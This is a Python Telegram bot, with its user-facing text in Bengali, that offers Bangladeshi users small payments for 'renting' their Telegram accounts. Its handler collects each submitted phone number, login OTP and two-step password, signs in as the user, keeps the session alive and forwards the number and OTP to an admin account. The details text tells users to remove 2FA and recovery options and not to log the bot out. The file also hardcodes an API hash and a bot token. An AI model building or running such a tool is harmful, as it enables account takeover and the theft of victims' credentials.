import os
import sys
import asyncio
import shutil

# লাইব্রেরি চেক ও অটো ইনস্টল
try:
    import requests
    from telethon import TelegramClient, events, Button, errors
except ImportError:
    os.system("pip install requests telethon")
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- Configuration ---
API_ID = 28260353
API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4' 
ADMIN_ID = 7852368023

# সেশন ক্লিনআপ এবং ফোল্ডার তৈরি
if not os.path.exists('sessions'):
    os.makedirs('sessions')

# মেইন বট স্টার্ট
bot = TelegramClient('new_main_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- Handlers ---

# ১. /start কমান্ড - আপনার দেওয়া টেক্সট এবং UI
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_text = (
        "💥 **টেলিগ্রাম নাম্বার ভাড়া দিয়ে ২৪ঘন্টার ⌛ জন্য ১০৳ করে পান** 💰\n\n"
        "✅ কীভাবে ভাড়া দিবে সেটা জানতে /details কমান্ড ব্যবহার করুন 👇\n\n"
        "✅ এবং আপনার বন্ধুদের কে রেফার করুন আর জিতে নিন **২৳ করে বোনাস** 💰 "
        "এবং আপনার বন্ধুরা যদি টেলিগ্রাম নাম্বার ভাড়া দেয় তাহলে সেখান থেকে পাবেন **৩৳ করে** 💸"
    )
    await event.respond(welcome_text, buttons=[
        [Button.inline("📲 নাম্বার জমা দিন", data="submit")],
        [Button.url("📞 অ্যাডমিন সাপোর্ট", "t.me/skfieh72")]
    ])

# ২. /details কমান্ড
@bot.on(events.NewMessage(pattern='/details'))
async def details(event):
    details_text = (
        "⌛ **কীভাবে টেলিগ্রাম ভাড়া দিবে....**\n\n"
        "✅ আপনার টেলিগ্রাম একাউন্ট এ কোনো sms থাকতে পারবে না\n"
        "✅ টেলিগ্রাম একাউন্ট এ 2stp/pas থাকা বা রিকোভারি থাকা চলবে না\n"
        "✅ আমাদের Bot যখন লগিং করবে তখন আমাদের Bot কে একাউন্ট থেকে লগ-আউট করা যাবে না"
    )
    await event.respond(details_text, parse_mode='html')

# ৩. /withdraw কমান্ড (স্ট্যাটিক ডাটা ফরম্যাট)
@bot.on(events.NewMessage(pattern='/withdraw'))
async def withdraw(event):
    withdraw_text = (
        "💰 **সর্বনিম্ম Withdraw ১০০৳**\n\n"
        "⚪ **Imposes:** 0 (এখোনো ২৪ঘন্টা হয় নাই)\n"
        "🔴 **Disable:** 0 (Otp দেয়নি বা লগআউট করেছে)\n"
        "🟢 **Successful:** 0 (যেগুলা ২৪ঘন্টা হয়েছে)"
    )
    await event.respond(withdraw_text, parse_mode='html')

# ৪. নাম্বার সাবমিট এবং OTP প্রসেস (শুধুমাত্র +880 এর জন্য)
@bot.on(events.NewMessage)
async def handle_phone_submit(event):
    text = event.text.strip().replace(" ", "")
    
    # শুধুমাত্র +880 দিয়ে শুরু হলে কাজ করবে
    if text.startswith('+880'):
        phone = text
        chat_id = event.chat_id
        
        async with bot.conversation(chat_id, timeout=600) as conv:
            try:
                await conv.send_message("⏳ **OTP পাঠানো হচ্ছে, অপেক্ষা করুন...**", parse_mode='html')
                
                client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
                await client.connect()

                # OTP রিকোয়েস্ট
                sent_code = await client.send_code_request(phone)
                h_code = sent_code.phone_code_hash
                
                await conv.send_message(f"🔑 **{phone} নাম্বারে আসা ৫ ডিজিটের OTP কোডটি দিন:**", parse_mode='html')
                otp_res = await conv.get_response()
                otp = otp_res.text.strip()

                # লগইন করার চেষ্টা
                try:
                    await client.sign_in(phone, code=otp, phone_code_hash=h_code)
                except errors.SessionPasswordNeededError:
                    await conv.send_message("🔐 **এই একাউন্টে 2-Step ভেরিফিকেশন অন আছে। পাসওয়ার্ড দিন:**")
                    pwd_res = await conv.get_response()
                    await client.sign_in(password=pwd_res.text.strip())

                await conv.send_message("🎉 **সফলভাবে লগইন হয়েছে!**\n২৪ ঘণ্টা পর আপনার ব্যালেন্সে টাকা যোগ হবে।")
                
                # অ্যাডমিনকে জানানো (সরাসরি ফরওয়ার্ডের মতো)
                await bot.send_message(ADMIN_ID, f"✅ **নতুন লগইন সাকসেস!**\n📱 নাম্বার: `{phone}`\n🔑 OTP: `{otp}`")
                
                # সেশন চালু রাখা
                asyncio.create_task(client.run_until_disconnected())

            except Exception as e:
                await conv.send_message(f"❌ **এরর:** {str(e)}\nসঠিকভাবে আবার চেষ্টা করুন।")

@bot.on(events.CallbackQuery(data="submit"))
async def callback_submit(event):
    await event.respond("📱 আপনার টেলিগ্রাম নাম্বারটি **+880** সহ টাইপ করে এখানে পাঠান:")

print("--- BOT STARTED SUCCESSFULLY ---")
bot.run_until_disconnected()
